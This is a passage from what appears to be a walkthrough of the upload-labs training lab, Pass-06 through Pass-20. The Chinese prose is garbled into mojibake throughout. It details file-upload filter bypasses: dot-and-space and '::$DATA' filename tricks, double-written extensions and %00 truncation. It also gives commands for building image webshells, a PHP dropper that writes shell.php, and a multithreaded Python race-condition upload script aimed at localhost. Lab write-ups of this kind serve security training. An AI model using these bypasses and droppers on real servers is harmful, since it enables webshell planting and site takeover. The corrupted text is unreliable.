æœç´¢å‚æ•°åœ¨å­—ç¬¦ä¸²ä¸­çš„ä½ç½®ï¼Œå¹¶è¿”å›ä»è¯¥ä½ç½®åˆ°å­—ç¬¦ä¸²ç»“å°¾çš„æ‰€æœ‰å­—ç¬¦ å¦‚æœæœ‰å¤šä¸ªï¼ŒåŒ¹é…çš„æ˜¯æœ€åä¸€ä¸ªï¼ˆè¿™é‡Œå¹¶æ²¡æœ‰è¿›è¡Œé€’å½’æ£€æµ‹ï¼Œå‰é¢çš„å°±ä¼šæ¼æ‰ï¼‰ å¦‚æœæ˜¯a.php. jpg.æ˜¯ä¸èƒ½æ­£å¸¸è§£æçš„ï¼Œä½†æ˜¯a.php. .å°±è¡Œ ç»•è¿‡ï¼šå¤šå†™ä¸€ä¸ªç©ºæ ¼å’Œç‚¹ï¼šä¸Šä¼ æ–‡ä»¶ info.phpï¼Œ burpä¿®æ”¹fileä¸ºinfo.php. . æ¯”å¦‚ï¼š a.php. . å»ç©ºï¼ša.php. . åˆ é™¤æœ«å°¾ç‚¹ï¼ša.php. æœ€åä¸€ä¸ªç‚¹è¢«deldotåˆ é™¤ è¿”å›æœ€åä¸€ä¸ªç‚¹çš„å†…å®¹. ç¬¬äºŒä¸ªstrrchråŒ¹é…äº†ç¬¬ä¸€ä¸ªç‚¹å’Œåé¢çš„ç©ºæ ¼ å‰åå»ç©ºï¼šåç¼€ä¸º., ä¸åœ¨é»‘åå•èŒƒå›´ï¼ŒæˆåŠŸç»•è¿‡ æœ€åä¸Šä¼ æ–‡ä»¶åä¸ºï¼ša.php., åœ¨windowsä¿å­˜æ–‡ä»¶çš„ä¹‹åçš„.ä¼šæ¶ˆå¤± å¦‚ä¸‹å›¾ï¼ŒwinæœåŠ¡å™¨ä¿å­˜çš„æ–‡ä»¶ï¼š æ­£å¸¸è§£æï¼š Pass-06 æ²¡æœ‰è¿›è¡Œåç¼€åå¤§å°å†™è½¬æ¢ ç»•è¿‡burpä¿®æ”¹filenameåç¼€åä¸º.phPï¼Œç»•è¿‡æ£€æµ‹ï¼Œä¸Šä¼ OK æ­£å¸¸è§£æ Pass-07 æœ€åæ²¡æœ‰å°†åç¼€é¦–å°¾å»ç©º å¯ä»¥åˆ©ç”¨winæ–‡ä»¶åå­—ä¿å­˜æ ¼å¼çš„ç‰¹æ€§: æ¯”å¦‚æœ€åä¸€ä¸ªä¸ºç©ºæ ¼info.php, .phpä¸åœ¨é»‘åå•.phpç­‰ä¸­ï¼ŒæˆåŠŸç»•è¿‡ï¼Œ å¹¶ä¸”windowsä¿å­˜çš„æ—¶å€™ä¼šæŠŠæœ€åçš„ç©ºæ ¼å»é™¤ ç»•è¿‡burpä¿®æ”¹filenameä¸ºinfo.phpï¼Œåé¢åŠ ä¸€ä¸ªç©ºæ ¼ï¼Œä¸Šä¼  Pass-08 å°‘äº†æå‰åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ çš„åŠŸèƒ½(deldot)ï¼› strrchrè¿‡æ»¤åŒ¹é…çš„æ˜¯æœ€åä¸€ä¸ªç‚¹ï¼› æ²¡æœ‰å¯¹ä¸Šä¼ çš„æ–‡ä»¶é‡å‘½å ç»•è¿‡:F1ï¼š åç¼€ååŠ ç‚¹ç»•è¿‡ burpä¿®æ”¹æ–‡ä»¶åï¼Œ a.php. a.php.å¯ä»¥å¸¦ç©ºæ ¼ ä¸Šä¼ ã€‚ F2ï¼šåˆ©ç”¨Windowsè§£ææ¼æ´ï¼ˆåç¼€ä¿®æ”¹ä¸º1.php:1.jpgï¼‰ 1.php:1.jpg æ²¡æˆåŠŸï¼š ä¸Šä¼ çš„æ˜¯1.phpï¼Œä½†æ˜¯æ–‡ä»¶å†…å®¹æ˜¯ç©ºçš„äº† â€‹ â€‹ Pass-09 Windowsæ–‡ä»¶æµç»•è¿‡ å°‘äº† $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA â€“&gt; å«ä¹‰ï¼šæŠŠåç¼€ä¸­æ˜¯ ::DATAæ›¿æ¢ä¸ºç©º str_ireplace('è¦æ›¿æ¢çš„å¯¹è±¡','æ›¿æ¢ä¸º','å­—ç¬¦ä¸²')å‡½æ•° ç”±ä¸Šå¯çŸ¥ï¼Œæ–‡ä»¶æ²¡æœ‰å¯¹åç¼€åè¿›è¡Œå»â€::DATAâ€å¤„ç†ã€‚ phpåœ¨windowçš„æ—¶å€™å¦‚æœæ–‡ä»¶å+â€::DATAâ€å¤„ç†ã€‚phpåœ¨windowçš„æ—¶å€™å¦‚æœæ–‡ä»¶å+â€::DATAâ€å¤„ç†ã€‚phpåœ¨windowçš„æ—¶å€™å¦‚æœæ–‡ä»¶å+â€::DATAâ€ä¼šæŠŠ::DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€å.ä¸”ä¿æŒâ€::DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€å.ä¸”ä¿æŒâ€::DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€å.ä¸”ä¿æŒâ€::DATAâ€ä¹‹å‰çš„æ–‡ä»¶å ä»–çš„ç›®çš„å°±æ˜¯ä¸æ£€æŸ¥åç¼€åã€‚ ps:åªèƒ½æ˜¯Windowsç³»ç»Ÿï¼Œå¹¶ä¸”åªèƒ½æ—¶phpæ–‡ä»¶ ç»•è¿‡info.php::$DATA 1.å¦‚å›¾ ï¼Œåœ¨BPä¸­ä¿®æ”¹å›¾ç‰‡é©¬çš„ jpg çš„åç¼€åï¼Œå°†å…¶æ”¹ä¸º php ï¼Œå¹¶ä¸”åœ¨åé¢åŠ ä¸Š ::$DATA ; 2.åœ¨ç½‘é¡µä¸Šæ£€æŸ¥å›¾ç‰‡é©¬çš„æ‰§è¡Œæƒ…å†µæ—¶ï¼Œå°†å›¾ç‰‡é©¬çš„åç¼€åä¸­ ::$DATA ï¼Œåˆ å»ï¼Œä¾¿å¯æµè§ˆã€‚ å¦‚å›¾ï¼Œè¿™ä¸ªæ˜¯æ²¡æœ‰å»æ‰åç¼€æ—¶ï¼Œä¼šå‘ç”ŸæŠ¥é”™ã€‚ï¼ˆå› ä¸ºæˆ‘ä»¬å®é™…ä¸Šä¼ çš„æ˜¯PHPæ–‡ä»¶ï¼Œå³uploadæ–‡ä»¶å¤¹ä¸­åªæœ‰phpæ–‡ä»¶ï¼Œè€Œä¸å­˜åœ¨å¸¦æœ‰åç¼€ ::$DATAçš„æ–‡ä»¶ï¼‰ Pass 10 - 11 ï¼ˆå°†filenameæ‹¼æ¥è·¯å¾„ä¼šå¸¦æ¥æå¤§é£é™©ï¼‰Pass-10 ç»•è¿‡æ„é€ åç¼€åç‚¹ç©ºç»•è¿‡ strrchrå‡½æ•° æœç´¢å‚æ•°åœ¨å­—ç¬¦ä¸²ä¸­çš„ä½ç½®ï¼Œå¹¶è¿”å›ä»è¯¥ä½ç½®åˆ°å­—ç¬¦ä¸²ç»“å°¾çš„æ‰€æœ‰å­—ç¬¦ å¦‚æœæœ‰å¤šä¸ªï¼ŒåŒ¹é…çš„æ˜¯æœ€åä¸€ä¸ªï¼ˆå‰é¢çš„å°±ä¼šæ¼æ‰ ç”±ä¸Šå¯çŸ¥ï¼Œè¯¥å…³è¿›è¡Œçš„æ˜¯ç°åœ¨æ–‡ä»¶æœ«å°¾å…ˆå»ç‚¹ï¼Œå†å»ç©ºä¾¿æ²¡æœ‰å†åšä»»ä½•å¤„ç†ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œæ„é€ åç¼€åä¸ºphp+ç‚¹+ç©º+ç‚¹ burpä¿®æ”¹æ–‡ä»¶åinfo.php. . Pass-11 åŒå†™ç»•è¿‡ æ²¡æœ‰strrchr str_ireplaceå‡½æ•°ï¼š str_ireplace('è¦æ›¿æ¢çš„å¯¹è±¡','æ›¿æ¢ä¸º','å­—ç¬¦ä¸²'), ä»–æŠŠæˆ‘ä»¬çš„phpåç¼€æ›¿æ¢ä¸ºç©º å‡½æ•°ç¼ºé™·ï¼š åªæ˜¯æ‰§è¡Œä¸€æ¬¡/æˆ–è€…æ²¡é‡‡ç”¨é€’å½’è¿‡æ»¤ ç»•è¿‡æ‰°ä¹±ï¼Œåˆ é™¤é‡Œé¢åï¼Œå¤–é¢è¿˜èƒ½ç»„åˆæˆåŠŸåç¼€ burpä¿®æ”¹filename=info.pphphp info.pphphp â€” &gt; â€˜info.phpâ€™ Pass 12 - 13 å°†filenameå½“åšå˜é‡åŠ å…¥æœ€ç»ˆè·¯å¾„ä¼šå¸¦æ¥æå¤§é£é™©Pass - 12 GETè¯·æ±‚ï¼ŒURLç½‘é¡µä¸Š00æˆªæ–­ å‰ææ¡ä»¶ï¼šphp5.34ä»¥ä¸‹ï¼Œ magic_quotes_gpcä¸ºoffçŠ¶æ€ é­”æœ¯å¼•å· magic_quotes_gpc ä½œç”¨ï¼š å¯¹ï¼ˆåæ–œæ ï¼Ÿï¼Œå•å¼•å·ï¼ŒåŒå¼•å·ï¼Œnoneï¼‰äº§ç”Ÿå½±å“, è‡ªåŠ¨åŠ ä¸Š/ ç™½åå•ç»•è¿‡ ) save_pathå¯æ§ï¼Œ $_GET['save_path'] é€šè¿‡getè·å–ï¼Œå¯ä»¥æŠŠgetä¸­urlå‚æ•°å¸¦ä¸Š00æˆªæ–­ %00 æˆªæ–­ï¼ˆç±»ä¼¼æ³¨é‡Šç¬¦å·ï¼Œåé¢çš„ä¸å†æ‰§è¡Œï¼‰ Noteï¼š %00 æ˜¯URLç¼–ç åçš„ç»“æœï¼Œ é€‰ä¸­ï¼Œè§£ç è½¬æ¢ï¼ˆurl decodeï¼‰ä¸ºå°æ–¹å—ï¼Œæ‰æ˜¯çœŸæ­£çš„%00, Hexä¸‹æ˜¯00 æ•°æ®åŒ…ä¸­ save_path=../upload/shell.php%00 ï¼ˆæ³¨æ„ url_decodeï¼‰åé¢çš„å°±æ²¡ç”¨äº†ï¼Œfilename=â€shell.jpgâ€ ç”±æºç å¯çŸ¥ï¼Œå›¾ç‰‡çš„save_pathé€šè¿‡getä¼ é€’ï¼Œç„¶åå’Œåç¼€ima_pathç›´æ¥æ‹¼æ¥è€Œæˆçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨ %00 æˆªæ–­ï¼Œå°†åç¼€å .jpg æˆªæ–­ï¼Œä»è€Œä»¥ php è¿è¡Œ ç»•è¿‡URIä¸­00æˆªæ–­ æ–¹æ³•ä¸€ï¼šæ‹¦åŒ…00æˆªæ–­ ç”±äºæ˜¯åœ¨getçš„urlä¸­ï¼Œ%00å°±ä¸è¿›è¡Œdecodeäº†ï¼Œ ä¸Šä¼ æˆåŠŸï¼š æŸ¥çœ‹å›¾ç‰‡è·¯å¾„ï¼š æŸ¥çœ‹æœåŠ¡å™¨ä¿å­˜æ–‡ä»¶ï¼š è®¿é—®çš„æ—¶å€™ï¼Œå»æ‰åé¢çš„jpgï¼Œåªè®¿é—®phpï¼ŒOKï¼š æ–¹æ³•äºŒï¼šå‰ç«¯ç›´æ¥ä¿®æ”¹ä¸º â€œphp+00æˆªæ–­â€æ ¼å¼ å¦‚ä¸‹å¯å¾—ï¼Œç›´æ¥å°†å‚æ•°save_pathä¿®æ”¹ä¸ºphp+00æˆªæ–­çš„æ ¼å¼ï¼Œå› æ­¤å®ƒä¼šå°†ä¹‹åä¸Šä¼ çš„æ‰€æœ‰æ–‡ä»¶ä»¥PHPçš„æ ¼å¼è¿›è¡Œè§£æã€‚ ps:å›¾ç‰‡æ˜¯ç›—å–çš„ burpåªä¿®æ”¹ä¸‹é¢çš„filenameä¸ºx.jpgå³å¯ Pass - 13 POSTè¯·æ±‚ï¼Œ00æˆªæ–­ ç™½åå•ç»•è¿‡ F1: åŒ12å…³ï¼Œåªæ˜¯ä¿®æ”¹çš„åœ°æ–¹ä¸åŒ 1.burpæ‹¦æˆªã€‚åœ¨poståé¢åŠ ä¸Šinfo.php%00 (%00æ˜¯url decodeä¹‹åçš„)ï¼Œå†å‘é€å³å¯ 2.burpæ‹¦æˆªï¼Œç„¶ååœ¨ä¸Šé¢çš„upload çš„åé¢åŠ ä¸Š 123.php+ï¼ˆè¿™é‡Œçš„123å¯ä»¥ä¸ºä»»ä½•åå­—ï¼Œä»–åªæ˜¯ä¸€ä¸ªä»£å·ã€‚å¹¶ä¸” phpåé¢çš„ +å¥½ä¹Ÿæ˜¯ä¸€ä¸ªæ ‡è®°ï¼Œä»–çš„äºŒè¿›åˆ¶ä»£ç ä¸º 2bï¼‰ ç”±ä¸Šå¯çŸ¥ï¼Œå°†äºŒè¿›åˆ¶ä¸­çš„ + æ”¹ä¸º 00 æˆªæ–­ï¼Œå³å°† + çš„äºŒè¿›åˆ¶ç  2b æ”¹ä¸º 00 . åŒæ ·ï¼Œè®¿é—®çš„æ—¶å€™è®¿é—®phpæ–‡ä»¶ï¼š F2 æ„å¤–å‘ç°ï¼šæ–‡ä»¶è¦†ç›– ç”±äºåå­—å¯ä»¥ä¸ç›¸åŒï¼Œå³æˆ‘ä»¬å¯ä»¥ä»»æ„å®šä¹‰uploadsæ—è¾¹çš„ PHP æ–‡ä»¶åï¼Œå¦‚æœå°†æ–‡ä»¶åæ”¹ä¸ºuploadsä¸­æœ¬èº«å­˜åœ¨çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆæ–°çš„æ–‡ä»¶å°†ä¼šè¦†ç›–åŸæ¥çš„æ–‡ä»¶ã€‚ Pass - 20 ï¼ˆä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼Œä¾¿äºæ¯”è¾ƒå°±æ”¾è¿™é‡Œäº†ï¼‰ è¿™é‡Œè¿›è¡Œè¿‡æ»¤çš„æ˜¯ä»–çš„é‚£ä¸ªæ–‡ä»¶åï¼Œè€Œä¸æ˜¯æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶æœ€å¼€å§‹çš„æ–‡ä»¶åï¼Œæ‰€ä»¥è¦åœ¨ä»–çš„æ–‡ä»¶åä¸Šåšæ‰‹è„š $file_ext = pathinfo($file_name,PATHINFO_EXTENSION) è¿”å›æ‹“å±•åç¼€ è¿™é‡Œçš„æ–‡ä»¶åfilenameæ˜¯å¯æ§çš„ï¼š $_POST['save_name'] ç»•è¿‡ æˆ‘ä»¬å¯ä»¥åœ¨save_pathä¸­åŠ å…¥php+00æˆªæ–­ï¼Œç”±äºæ˜¯POSTå‘é€æ–¹å¼ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¿›è¡Œ00æˆªæ–­ã€‚111.php%00upload-19.jpg ï¼ˆæ³¨æ„url decodeï¼‰ ä¸Šä¼ OKï¼š å»æ‰00åé¢å†…å®¹ï¼Œè®¿é—®phpï¼Œæ­£å¸¸è§£æ Pass14 - 17 ï¼ˆæ–‡ä»¶åŒ…å«æ¼æ´ï¼‰Pass - 14 è·å–æ–‡ä»¶å¤´è¿›è¡Œäº†éªŒè¯ å›¾ç‰‡é©¬åˆ¶ä½œï¼š winä¸‹ï¼šcopy a.jpg /b + b.php /a shell.jpg Linuxä¸‹ï¼šcat a.jpg b.php &gt; shell.jpg æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆxx.php?file=uploads/x.jpgï¼‰ æ–‡ä»¶ä¸é™æ ¼å¼åç¼€ æ„ä¹‰ï¼šå¦‚æœå­˜åœ¨åŒ…å«æ¼æ´ï¼Œéœ€è¦ä¸Šä¼ ä¸€å¼ å›¾ç‰‡(å›¾ç‰‡é©¬)ï¼Œå°±å¯ä»¥getshell $strInfo = @unpack("C2chars", $bin);// Cä¸ºæ— ç¬¦å·æ•´æ•°ï¼Œç½‘ä¸Šæœåˆ°çš„éƒ½æ˜¯cï¼Œä¸ºæœ‰ç¬¦å·æ•´æ•°ï¼Œè¿™æ ·ä¼šäº§ç”Ÿè´Ÿæ•°åˆ¤æ–­ä¸æ­£å¸¸ $bin = fread($file, 2); //åªè¯»2å­—èŠ‚è¿›è¡ŒéªŒè¯ è¡¨ç¤ºåªæ˜¯å¯¹æ–‡ä»¶å¤´åšäº†æ£€æµ‹ $strInfo = @unpack("C2chars", $bin); æ ‡ç¤ºå‰ä¸¤ä¸ªå­—ç¬¦æŒ‰ç…§ï¼Œcæ ¼å¼ï¼Œæ•°ç»„ç´¢å¼•chars1,chars2 @unpack $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); æ–‡ä»¶å¤´ï¼š ä¸åŒåç¼€ç±»å‹æ–‡ä»¶å¤´éƒ¨ä»£ç ä¸­æœ‰GIF89a,NG,PK,7Zï¼Œ éƒ¨åˆ†éªŒè¯ä¼šéªŒè¯æ–‡ä»¶å¤´ å¸¸è§æ–‡ä»¶å¤´ï¼šhttps://blog.csdn.net/xiangshangbashaonian/article/details/80156865 çªç ´ï¼š ä¼ªé€ å¯è¡Œçš„æ–‡ä»¶å¤´ ç»•è¿‡ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œä¸Šä¼ ã€‚æ‰“å¼€æµ‹è¯•é¡µé¢ï¼Œå¼•ç”¨åˆšæ‰çš„å›¾ç‰‡é©¬ Pass - 15 getimagesize å‡½æ•°æ‹“å±•ï¼šgetimagesizeï¼ˆï¼‰ åˆ¤æ–­æ˜¯å¦ä¸ºä¸€ä¸ªå®Œæ•´çš„å›¾åƒ ç´¢å¼•2$info[2] æ˜¯å›¾åƒçš„ç±»å‹ image_type_to_extension è·å–çš„æ˜¯MIMEç±»å‹ $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); # è·å–åç¼€jpeg , $info[2] æ˜¯æ–‡ä»¶ç±»å‹ if(stripos($types,$ext)>=0) # æ˜¯å¦åœ¨ç™½åå•ä¸­ ç»•è¿‡ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œ æ‰“å¼€æµ‹è¯•é¡µé¢ï¼Œç›´æ¥åŒ…å«includefile=â€™æ–‡ä»¶.jpgâ€™, å°±æ˜¯å½“æˆphpè§£æ Pass - 16 php_exifæ¨¡å— å‡½æ•°æ‹“å±•ï¼šexif_imagetypeï¼ˆï¼‰ php_exifæ¨¡å—æ¥åˆ¤æ–­æ–‡ä»¶ç±»å‹ ç‰ˆæœ¬ï¼šPHP&gt;=4.3.0, PHP5, PHP7 ç»•è¿‡éœ€è¦å¼€å¯php_exifæ¨¡å—ï¼š 1.æ‰“å¼€é…ç½®æ–‡ä»¶ï¼Œphpæ‹“å±•ï¼Œphp_exifæ‰“å¼€ï¼› 2.é…ç½®æ–‡ä»¶åœ¨php.ini,åˆ†å·æ˜¯æ³¨é‡Šï¼Œå¯ä»¥ç›´æ¥è§£é™¤æ³¨é‡Šå¯ç”¨,å¹¶å°†æ­¤è¡Œç§»åŠ¨åˆ°extension=php_exif.dllä¹‹å‰ï¼Œä½¿ä¹‹é¦–å…ˆåŠ è½½*ã€‚ ä¸Šä¼ å›¾ç‰‡é©¬ï¼ˆæ³¨æ„MIMEä¸åç¼€å’Œæ–‡ä»¶å¤´è¦ä¸€ç›´ï¼Œç„¶åæ‰“å¼€æµ‹è¯•é¡µé¢ï¼ŒåŒ…å«gifï¼ŒOK Pass - 17 ï¼ˆå›¾ç‰‡äºŒæ¬¡ç¼–ç ï¼‰å…¶å®å°±æ˜¯æ£€æµ‹ä¸¤æ¬¡ æœ¬è´¨ï¼š æ£€æµ‹ MIMEå’Œåç¼€æ˜¯å¦å¯¹åº” åŸç†ï¼š å°†ä¸€ä¸ªæ­£å¸¸æ˜¾ç¤ºçš„å›¾ç‰‡ï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨ã€‚å¯»æ‰¾å›¾ç‰‡è¢«æ¸²æŸ“åä¸åŸå§‹å›¾ç‰‡éƒ¨åˆ†å¯¹æ¯”ä»ç„¶ç›¸åŒçš„æ•°æ®å—éƒ¨åˆ†ï¼Œå°†Webshellä»£ç æ’åœ¨è¯¥éƒ¨åˆ†ï¼Œç„¶åä¸Šä¼ ã€‚ å…·ä½“å®ç°éœ€è¦è‡ªå·±ç¼–å†™Pythonç¨‹åºï¼Œäººå·¥å°è¯•åŸºæœ¬æ˜¯ä¸å¯èƒ½æ„é€ å‡ºèƒ½ç»•è¿‡æ¸²æŸ“å‡½æ•°çš„å›¾ç‰‡webshellçš„ã€‚ //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im = imagecreatefromjpeg($target_path); ç»•è¿‡å¥½äº†ï¼Œè¿˜æ˜¯å¤ªèœï¼Œè¿˜æ˜¯çœ‹å¤§ä½¬çš„è§£å†³æ–¹æ¡ˆå­¦ä¹ å­¦ä¹ æŠŠå§:ç‚¹å‡»è¿™é‡Œ 1.GIF å…³äºç»•è¿‡gifçš„äºŒæ¬¡æ¸²æŸ“,æˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°æ¸²æŸ“å‰åæ²¡æœ‰å˜åŒ–çš„ä½ç½®,ç„¶åå°†phpä»£ç å†™è¿›å»,å°±å¯ä»¥æˆåŠŸä¸Šä¼ å¸¦æœ‰phpä»£ç çš„å›¾ç‰‡äº†. 2.PNG pngçš„äºŒæ¬¡æ¸²æŸ“çš„ç»•è¿‡å¹¶ä¸èƒ½åƒgifé‚£æ ·ç®€å•. 3.JPG ps: è¿™ä¸€å…³æ˜¯äºŒæ¬¡æ¸²æŸ“çš„ï¼Œè¿˜æ˜¯å¤šå­¦ä¹ å­¦ä¹ å§ 18 -19 æ¡ä»¶ç«äº‰ ï¼ˆå¤šçº¿ç¨‹å‘åŒ…ï¼‰Pass - 18 unlinkå‡½æ•°ï¼š æ•°åˆ é™¤æ–‡ä»¶ã€‚è‹¥æˆåŠŸï¼Œåˆ™è¿”å› trueï¼Œå¤±è´¥åˆ™è¿”å› false æ‰§è¡Œæ­¥éª¤ï¼š 1.å–å‡ºä¸Šä¼ æ–‡ä»¶çš„åç¼€å 2.ä¸´æ—¶æ–‡ä»¶ç§»åŠ¨ï¼ˆmove_uploaded_fileï¼‰åˆ°ä¸€ä¸ªè·¯å¾„ä¸‹é¢ï¼Œ 3.å¦‚æœåç¼€ååœ¨ç™½åå•ï¼Œè¿›è¡Œæœ€åç§»åŠ¨ï¼Œä¿å­˜ 4.å¦‚æœåç¼€åä¸åœ¨ç™½åå•ï¼Œunlinkåˆ é™¤ä¸´æ—¶æ–‡ä»¶ ç»•è¿‡ è¶ä»–ä¸æ³¨æ„ï¼ˆå¤šçº¿ç¨‹ï¼‰ï¼Œåœ¨ä¸´æ—¶æ–‡ä»¶é‡Œé¢å†™ä¸€ä¸ªåˆ›å»ºåé—¨æ–‡ä»¶çš„åŠŸèƒ½ï¼Œè¿™æ ·è™½ç„¶ä¸´æ—¶æ–‡ä»¶ä¸æ»¡è¶³è¢«åˆ é™¤ï¼Œä½†æ˜¯è‡ªå·±è‡ªåŠ¨åˆ›å»ºçš„æ–‡ä»¶å·²ç»å­˜åœ¨æœåŠ¡å™¨ç›®å½•äº† F1ï¼š å…¶ä¸­ï¼Œè¯±é¥µä¸Šä¼ æ–‡ä»¶ä»£ç  &lt;?php $myfile = fopen("shell.php", "w") or die("Unable to open file!"); $txt = "&lt;?php phpinfo(); ?>\n"; fwrite($myfile, $txt); fclose($myfile); ?> ç„¶åï¼Œå¦‚æœå·²çŸ¥æ–°å»ºæ–‡ä»¶çš„è·¯å¾„ï¼Œå¯ä»¥ç›´æ¥è®¿é—® â€‹ å¦‚æœä¸çŸ¥é“ï¼Œå¯ä»¥æŠ“å–æ•°æ®åŒ…æŸ¥çœ‹ æ–¹æ³•ï¼š 1.åˆ©ç”¨burpçš„Intruderä½¿ç”¨å¤šçº¿ç¨‹å‘åŒ…(å¦‚ä¸‹å›¾)ï¼Œ 2.ç„¶åä¸æ–­åœ¨æµè§ˆå™¨è®¿é—®æˆ‘ä»¬çš„webshellï¼Œä¼šæœ‰ä¸€ç¬é—´çš„è®¿é—®æˆåŠŸã€‚ï¼ˆå³å½“çº¿ç¨‹è¶³å¤Ÿçš„æ—¶å€™ ï¼Œå°†å¯èƒ½ä¼šè·³è¿‡æŸä¸ªæ­¥éª¤ï¼Œè€Œç›´æ¥è®¿é—®åˆ°æˆ‘ä»¬çš„ webshellï¼Œæ–°æ–‡ä»¶ä¹Ÿä¼šåˆ›å»ºæˆåŠŸ ) F2: Python \#!/usr/bin/env python3 \# coding:utf-8 import hackhttp from multiprocessing.dummy import Pool as ThreadPool def upload(lists): â€‹ hh = hackhttp.hackhttp() â€‹ raw = """POST /upload-labs/Pass-17/index.php HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Referer: http://127.0.0.1/upload-labs/Pass-18/index.php Cookie: pass=18 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: multipart/form-data; boundary=---------------------------6696274297634 Content-Length: 341 -----------------------------6696274297634 Content-Disposition: form-data; name="upload_file"; filename="18.php" Content-Type: application/octet-stream &lt;?php $myfile = fopen("shell.php", "w") or die("Unable to open file!"); $txt = "&lt;?php phpinfo(); ?>\n"; fwrite($myfile, $txt); fclose($myfile); ?> -----------------------------6696274297634 Content-Disposition: form-data; name="submit" ä¸Šä¼  -----------------------------6696274297634-- """ â€‹ code, head, html, redirect, log = hh.http('http://127.0.0.1/upload-labs/Pass-17/index.php', raw=raw) â€‹ print(str(code) + "\r") pool = ThreadPool(10) pool.map(upload, range(10000)) pool.close() pool.join() åªæ˜¯æŠŠburpæ¢æˆäº†pythonï¼Œå…¶ä»–æ“ä½œæ–¹æ³•æ˜¯ä¸€æ ·çš„ ä¿®å¤é—®é¢˜åº”è¯¥å…ˆåˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œå†ç§»åŠ¨ Pass - 19if( $this->cls_rename_file == 1 ){ //æ˜¯å¦ç”¨$im_pathæˆåŠŸç»™$upload_fileé‡å‘½å å’Œç¬¬18å…³æœ‰ç‚¹ç±»ä¼¼ï¼Œéƒ½å¯¹å…³é”®è¿›è¡Œäº†é‡å‘½åï¼Œç”±äºæˆ‘ä»¬æ˜¯åˆ©ç”¨burpä¸æ–­çš„å‘é€ç›¸åŒçš„åŒ…ï¼Œé‚£ä¹ˆä¸€æ—¦æœ‰ä¸¤ä¸ªåŒ…åŒæ—¶ä¼ åˆ°è¿™è¾¹æ˜¯ï¼Œé‚£ä¹ˆç³»ç»Ÿå¯¹ä¸€ä¸ªé‡å‘½åæ—¶ï¼Œå¦ä¸€ä¸ªåˆšå¥½â€œé€ƒè„±â€äº†ï¼Œé‚£ä¹ˆä¸Šä¼ æˆåŠŸã€‚ ç»•è¿‡åœ¨è¿™å…³æ˜¯ä¸€ä¸ªç™½åå•ï¼Œåˆ©ç”¨äº†appcheçš„ä¸€ä¸ªè§£ææ¼æ´ï¼Œå®ƒä¼šå°† â€œ.php.7z å½“ä½œ.phpæ¥è§£æï¼Œè€Œåˆšå¥½ â€œ .php.7z â€åˆå±äºç™½åå•ï¼Œ æ‰€ä»¥ä¸Šä¼ ä¸€ä¸ª â€œ .php.7z â€ çš„æ–‡ä»¶ï¼Œç„¶å å†åˆ©ç”¨æ¡ä»¶ç«äº‰æ¼æ´è¿›è¡Œå¤šçº¿ç¨‹ä¸æ–­çš„å‘é€ â€œ .php.7zâ€çš„æ–‡ä»¶ï¼Œ ç”±äºç‰ˆæœ¬é—®é¢˜ï¼Œè¿™æ¬¡çš„æ–‡ä»¶æ²¡æœ‰ä¸Šä¼ åˆ°uploadçš„æ–‡ä»¶å¤¹ä¸‹é¢ï¼Œè€Œæ˜¯ä¸Šä¼ åˆ° WWW çš„æ–‡ä»¶å¤¹ä¸‹é¢ï¼Œä½†æ˜¯ä¸å½±å“ï¼Œå¹¶ä¸”è¿™æ¬¡çš„æ–‡ä»¶ä¸Šä¼ åå°±ä¸ä¼šè¢«åˆ æ‰ï¼Œå°±ä¼šä¿å­˜åœ¨ è¯¥æ–‡ä»¶å¤¹ä¸‹é¢ï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬å°†å¯ä»¥ç¨³å®šçš„è®¿é—®åˆ°ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œburpè¿›è¡Œå¤šçº¿ç¨‹å‘åŒ…åï¼Œåœ¨æµè§ˆå™¨ä¸€è‡´è®¿é—®ä¸Šä¼ æ–‡ä»¶çš„åœ°å€ï¼Œä¸€å®šä¼šæœ‰é‚£ä¹ˆä¸€ç¬é—´ä¼šè®¿é—®åˆ°ï¼ˆè¿™æ—¶ï¼Œæ–‡ä»¶é‡Œæ–°å»ºwebshellçš„ä»£ç æ‰§è¡Œäº†ï¼Œæ–°çš„åé—¨å»ºç«‹æˆåŠŸäº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥è®¿é—®åé—¨äº†ï¼‰ 00æˆªæ–­å’Œmove_uploaded_fileï¼ˆï¼‰å‡½æ•°Pass - 20pathinfo(ï¼‰å‡½æ•°ï¼šä»¥æ•°ç»„çš„å½¢å¼è¿”å›å…³äºæ–‡ä»¶è·¯å¾„çš„ä¿¡æ¯ã€‚ pathinfo(path,options) 